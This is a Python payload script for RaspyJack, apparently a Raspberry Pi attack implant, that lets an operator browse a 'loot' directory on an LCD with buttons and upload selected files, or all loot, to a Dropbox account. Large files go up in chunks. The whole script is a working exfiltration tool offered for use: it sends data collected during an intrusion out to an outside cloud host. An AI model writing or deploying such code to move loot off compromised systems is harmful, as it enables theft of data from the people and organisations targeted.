#!/usr/bin/env python3
"""
RaspyJack Payload -- Dropbox Loot Uploader
-------------------------------------------
Author: 7h30th3r0n3

Upload loot files to Dropbox via the v2 API (urllib only, no external deps).
Supports browsing loot directory, selecting files/folders, chunked upload
for files >150MB.

Controls:
  UP/DOWN  = navigate files
  OK       = browse into folder / toggle selection
  KEY1     = upload selected files
  KEY2     = upload all loot
  KEY3     = exit / back
"""

import os
import sys
import time
import signal
import json
import urllib.request
import urllib.error
import threading

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

DEBOUNCE = 0.25
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot"
CONFIG_PATH = "/root/Raspyjack/loot/Dropbox/config.json"
UPLOAD_URL = "https://content.dropboxapi.com/2/files/upload"
SESSION_START_URL = "https://content.dropboxapi.com/2/files/upload_session/start"
SESSION_APPEND_URL = "https://content.dropboxapi.com/2/files/upload_session/append_v2"
SESSION_FINISH_URL = "https://content.dropboxapi.com/2/files/upload_session/finish"
CHUNK_SIZE = 150 * 1024 * 1024  # 150 MB threshold
CHUNK_UPLOAD_SIZE = 8 * 1024 * 1024  # 8 MB per chunk

running = True


def _signal_handler(*_):
    global running
    running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# -------------------------------------------------------------------
# Token management
# -------------------------------------------------------------------

def _load_token():
    """Load Dropbox token from env var or config file."""
    token = os.environ.get("DROPBOX_TOKEN", "")
    if token:
        return token
    try:
        with open(CONFIG_PATH, "r") as fh:
            cfg = json.load(fh)
        return cfg.get("token", "")
    except (OSError, json.JSONDecodeError, KeyError):
        return ""


def _save_token(token):
    """Persist token to config file."""
    config_dir = os.path.dirname(CONFIG_PATH)
    os.makedirs(config_dir, exist_ok=True)
    cfg = {"token": token}
    with open(CONFIG_PATH, "w") as fh:
        json.dump(cfg, fh, indent=2)


# -------------------------------------------------------------------
# Dropbox API helpers (urllib only)
# -------------------------------------------------------------------

def _dropbox_headers(token, api_arg=None):
    """Build authorization headers for Dropbox API."""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/octet-stream",
    }
    if api_arg is not None:
        headers["Dropbox-API-Arg"] = json.dumps(api_arg)
    return headers


def _upload_small_file(token, local_path, remote_path):
    """Upload a file <150MB via single upload endpoint."""
    with open(local_path, "rb") as fh:
        data = fh.read()

    api_arg = {
        "path": remote_path,
        "mode": "overwrite",
        "autorename": True,
        "mute": False,
    }
    req = urllib.request.Request(
        UPLOAD_URL,
        data=data,
        headers=_dropbox_headers(token, api_arg),
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            return json.loads(resp.read().decode()), None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode() if exc.fp else str(exc)
        return None, f"HTTP {exc.code}: {body[:80]}"
    except urllib.error.URLError as exc:
        return None, f"Network: {str(exc.reason)[:60]}"


def _upload_chunked(token, local_path, remote_path, progress_cb=None):
    """Upload a large file via session-based chunked upload."""
    file_size = os.path.getsize(local_path)

    # Start session
    req = urllib.request.Request(
        SESSION_START_URL,
        data=b"",
        headers=_dropbox_headers(token, {"close": False}),
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            session_data = json.loads(resp.read().decode())
        session_id = session_data["session_id"]
    except (urllib.error.HTTPError, urllib.error.URLError, KeyError) as exc:
        return None, f"Session start failed: {str(exc)[:50]}"

    # Append chunks
    offset = 0
    with open(local_path, "rb") as fh:
        while offset < file_size:
            chunk = fh.read(CHUNK_UPLOAD_SIZE)
            if not chunk:
                break

            is_last = (offset + len(chunk)) >= file_size
            if is_last:
                # Finish with last chunk
                api_arg = {
                    "cursor": {"session_id": session_id, "offset": offset},
                    "commit": {
                        "path": remote_path,
                        "mode": "overwrite",
                        "autorename": True,
                        "mute": False,
                    },
                }
                req = urllib.request.Request(
                    SESSION_FINISH_URL,
                    data=chunk,
                    headers=_dropbox_headers(token, api_arg),
                    method="POST",
                )
            else:
                api_arg = {
                    "cursor": {"session_id": session_id, "offset": offset},
                    "close": False,
                }
                req = urllib.request.Request(
                    SESSION_APPEND_URL,
                    data=chunk,
                    headers=_dropbox_headers(token, api_arg),
                    method="POST",
                )

            try:
                with urllib.request.urlopen(req, timeout=300) as resp:
                    if is_last:
                        result = json.loads(resp.read().decode())
                    else:
                        resp.read()
            except (urllib.error.HTTPError, urllib.error.URLError) as exc:
                return None, f"Chunk at {offset} failed: {str(exc)[:40]}"

            offset += len(chunk)
            if progress_cb:
                progress_cb(offset, file_size)

    return {"status": "ok", "size": file_size}, None


def _upload_file(token, local_path, remote_path, progress_cb=None):
    """Upload a single file, choosing chunked for large files."""
    file_size = os.path.getsize(local_path)
    if file_size > CHUNK_SIZE:
        return _upload_chunked(token, local_path, remote_path, progress_cb)
    return _upload_small_file(token, local_path, remote_path)


# -------------------------------------------------------------------
# File system helpers
# -------------------------------------------------------------------

def _list_entries(directory):
    """List entries in a directory, sorted: folders first then files."""
    try:
        entries = os.listdir(directory)
    except OSError:
        return []

    folders = []
    files = []
    for name in sorted(entries):
        full = os.path.join(directory, name)
        if os.path.isdir(full):
            folders.append({"name": name, "type": "dir", "path": full})
        elif os.path.isfile(full):
            size = 0
            try:
                size = os.path.getsize(full)
            except OSError:
                pass
            files.append({"name": name, "type": "file", "path": full, "size": size})

    return folders + files


def _format_size(size_bytes):
    """Format file size for display."""
    if size_bytes < 1024:
        return f"{size_bytes}B"
    if size_bytes < 1024 * 1024:
        return f"{size_bytes // 1024}K"
    if size_bytes < 1024 * 1024 * 1024:
        return f"{size_bytes // (1024 * 1024)}M"
    return f"{size_bytes // (1024 * 1024 * 1024)}G"


def _collect_all_files(directory):
    """Recursively collect all file paths under a directory."""
    result = []
    try:
        for root, _dirs, filenames in os.walk(directory):
            for fname in filenames:
                result.append(os.path.join(root, fname))
    except OSError:
        pass
    return result


# -------------------------------------------------------------------
# Display functions
# -------------------------------------------------------------------

def _draw_header(d, title, right_text="K3"):
    """Draw standard header bar."""
    d.rectangle((0, 0, 127, 13), fill="#1a1a2e")
    d.text((2, 1), title, font=font, fill="#00d4ff")
    d.text((108, 1), right_text, font=font, fill="white")


def _draw_footer(d, text):
    """Draw standard footer bar."""
    d.rectangle((0, 116, 127, 127), fill="#1a1a2e")
    d.text((2, 117), text, font=font, fill="#666666")


def _draw_browser(entries, cursor, selected_set, scroll, current_dir):
    """Draw the file browser screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    rel_dir = current_dir.replace(LOOT_DIR, "loot") if current_dir.startswith(LOOT_DIR) else current_dir
    _draw_header(d, rel_dir[:16])

    visible_rows = 8
    y = 16
    for idx in range(scroll, min(len(entries), scroll + visible_rows)):
        entry = entries[idx]
        is_cursor = idx == cursor
        is_selected = entry["path"] in selected_set

        bg = "#333333" if is_cursor else "black"
        d.rectangle((0, y, 127, y + ROW_H - 1), fill=bg)

        icon = "[+]" if is_selected else "   "
        if entry["type"] == "dir":
            name_str = f"{icon}[{entry['name'][:10]}]"
            color = "#ffcc00"
        else:
            size_str = _format_size(entry.get("size", 0))
            name_str = f"{icon}{entry['name'][:10]} {size_str}"
            color = "#00ff88" if is_selected else "#cccccc"

        d.text((2, y), name_str, font=font, fill=color)
        y += ROW_H

    if not entries:
        d.text((10, 50), "Empty directory", font=font, fill="#666666")

    _draw_footer(d, "K1=upl K2=all OK=sel")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_upload_status(filename, progress, total, idx, count, error=None):
    """Draw upload progress screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Uploading...")

    d.text((2, 20), f"File {idx}/{count}", font=font, fill="#aaaaaa")
    d.text((2, 34), filename[:20], font=font, fill="#00ff88")

    # Progress bar
    bar_x, bar_y = 4, 52
    bar_w, bar_h = 120, 10
    d.rectangle((bar_x, bar_y, bar_x + bar_w, bar_y + bar_h), outline="#444444")
    if total > 0:
        fill_w = int((progress / total) * bar_w)
        if fill_w > 0:
            d.rectangle((bar_x, bar_y, bar_x + fill_w, bar_y + bar_h), fill="#00d4ff")

    pct = int((progress / total) * 100) if total > 0 else 0
    d.text((50, 66), f"{pct}%", font=font, fill="white")

    size_info = f"{_format_size(progress)}/{_format_size(total)}"
    d.text((2, 80), size_info, font=font, fill="#888888")

    if error:
        d.text((2, 96), error[:20], font=font, fill="#ff4444")

    _draw_footer(d, "Please wait...")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_result(success_count, fail_count, errors):
    """Draw upload results summary."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Upload Done")

    d.text((2, 20), f"Success: {success_count}", font=font, fill="#00ff88")
    d.text((2, 34), f"Failed:  {fail_count}", font=font, fill="#ff4444")

    y = 52
    for err_msg in errors[:4]:
        d.text((2, y), err_msg[:20], font=font, fill="#ff8800")
        y += ROW_H

    _draw_footer(d, "KEY3=back")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_no_token():
    """Draw missing token error screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Dropbox Upload")

    d.text((2, 24), "No token found!", font=font, fill="#ff4444")
    d.text((2, 40), "Set env var:", font=font, fill="#aaaaaa")
    d.text((2, 54), "DROPBOX_TOKEN", font=font, fill="#ffcc00")
    d.text((2, 70), "Or create config:", font=font, fill="#aaaaaa")
    d.text((2, 84), CONFIG_PATH[:20], font=font, fill="#ffcc00")
    d.text((2, 96), '{"token":"..."}', font=font, fill="#888888")

    _draw_footer(d, "KEY3=exit")
    LCD.LCD_ShowImage(img, 0, 0)


# -------------------------------------------------------------------
# Upload logic
# -------------------------------------------------------------------

def _do_upload_files(token, file_paths):
    """Upload a list of files, displaying progress on LCD."""
    count = len(file_paths)
    success_count = 0
    fail_count = 0
    errors = []

    for idx, fpath in enumerate(file_paths, 1):
        if not running:
            break

        filename = os.path.basename(fpath)
        file_size = 0
        try:
            file_size = os.path.getsize(fpath)
        except OSError:
            pass

        # Build remote path preserving loot structure
        if fpath.startswith(LOOT_DIR):
            remote = "/RaspyJack" + fpath[len(LOOT_DIR):]
        else:
            remote = f"/RaspyJack/{filename}"

        _draw_upload_status(filename, 0, file_size, idx, count)

        def _progress(uploaded, total):
            _draw_upload_status(filename, uploaded, total, idx, count)

        result, err = _upload_file(token, fpath, remote, _progress)

        if err:
            fail_count += 1
            errors.append(f"{filename}: {err[:30]}")
            _draw_upload_status(filename, file_size, file_size, idx, count, err[:20])
            time.sleep(1.0)
        else:
            success_count += 1
            _draw_upload_status(filename, file_size, file_size, idx, count)
            time.sleep(0.3)

    return success_count, fail_count, errors


# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------

def main():
    """Main entry point."""
    token = _load_token()
    if not token:
        try:
            _draw_no_token()
            while running:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    break
                time.sleep(0.1)
        finally:
            LCD.LCD_Clear()
            GPIO.cleanup()
        return 0

    current_dir = LOOT_DIR
    entries = _list_entries(current_dir)
    cursor = 0
    scroll = 0
    selected_set = set()
    last_press = 0.0
    mode = "browse"  # browse | result
    result_data = (0, 0, [])
    dir_stack = []

    try:
        while running:
            btn = get_button(PINS, GPIO)
            now = time.time()

            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if mode == "result":
                _draw_result(*result_data)
                if btn == "KEY3":
                    mode = "browse"
                    selected_set = set()
                time.sleep(0.08)
                continue

            # Browse mode
            if btn == "KEY3":
                if dir_stack:
                    current_dir, cursor, scroll = dir_stack.pop()
                    entries = _list_entries(current_dir)
                    selected_set = set()
                else:
                    break

            elif btn == "UP":
                if cursor > 0:
                    cursor -= 1
                    if cursor < scroll:
                        scroll = cursor

            elif btn == "DOWN":
                if cursor < len(entries) - 1:
                    cursor += 1
                    if cursor >= scroll + 8:
                        scroll = cursor - 7

            elif btn == "OK" and entries:
                entry = entries[cursor]
                if entry["type"] == "dir":
                    dir_stack.append((current_dir, cursor, scroll))
                    current_dir = entry["path"]
                    entries = _list_entries(current_dir)
                    cursor = 0
                    scroll = 0
                else:
                    path = entry["path"]
                    if path in selected_set:
                        selected_set = selected_set - {path}
                    else:
                        selected_set = selected_set | {path}

            elif btn == "KEY1":
                # Upload selected files
                files_to_upload = []
                for entry in entries:
                    if entry["path"] in selected_set:
                        if entry["type"] == "dir":
                            files_to_upload.extend(_collect_all_files(entry["path"]))
                        else:
                            files_to_upload.append(entry["path"])

                if files_to_upload:
                    sc, fc, errs = _do_upload_files(token, files_to_upload)
                    result_data = (sc, fc, errs)
                    mode = "result"

            elif btn == "KEY2":
                # Upload all loot
                all_files = _collect_all_files(LOOT_DIR)
                if all_files:
                    sc, fc, errs = _do_upload_files(token, all_files)
                    result_data = (sc, fc, errs)
                    mode = "result"

            _draw_browser(entries, cursor, selected_set, scroll, current_dir)
            time.sleep(0.08)

    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
